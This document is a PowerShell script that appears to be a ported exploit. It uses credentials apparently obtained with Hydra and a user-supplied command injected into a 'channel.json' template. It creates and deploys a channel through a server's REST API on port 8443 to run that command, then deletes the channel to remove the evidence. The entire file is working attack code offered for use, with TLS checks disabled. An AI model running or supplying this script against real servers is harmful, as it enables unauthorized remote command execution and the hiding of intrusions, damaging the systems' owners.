# PowerShell equivalent script

# Assuming the equivalent for the initial Hydra command is not required in PowerShell as it pertains to a specific tool usage

param (
    [string]$USERNAME,
    [string]$PASSWORD,
    [string]$CMD
)

$AUTH = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes("${USERNAME}:${PASSWORD}"))
$ID = [guid]::NewGuid().ToString()
$PAYLOAD = Get-Content -Path "channel.json" -Raw | ForEach-Object { $_ -replace "!!ID!!", $ID } | ForEach-Object { $_ -replace "!!CMD!!", $CMD }

Write-Host "[.] Creating channel $ID ..."
Invoke-RestMethod -Uri "https://localhost:8443/api/channels" -Method Post -Headers @{
    "Authorization" = "Basic $AUTH"
    "accept" = "application/json"
    "Content-Type" = "application/json"
    "X-Requested-With" = "OpenAPI"
} -Body $PAYLOAD -SkipCertificateCheck

Write-Host "[.] Deploying channel ..."
Invoke-RestMethod -Uri "https://localhost:8443/api/channels/_deploy" -Method Post -Headers @{
    "Authorization" = "Basic $AUTH"
    "accept" = "application/xml"
    "Content-Type" = "application/json"
    "X-Requested-With" = "OpenAPI"
} -Body (@{set = @{string = @($ID)}} | ConvertTo-Json) -SkipCertificateCheck

Write-Host "[!] Channel deployed!"
Write-Host "[.] Deleting channel ..."
Invoke-RestMethod -Uri "https://localhost:8443/api/channels/$ID" -Method Delete -Headers @{
    "Authorization" = "Basic $AUTH"
    "accept" = "application/json"
    "Content-Type" = "application/json"
    "X-Requested-With" = "OpenAPI"
} -SkipCertificateCheck

Write-Host "[.] Channel deleted."
Write-Host "[+] All done."
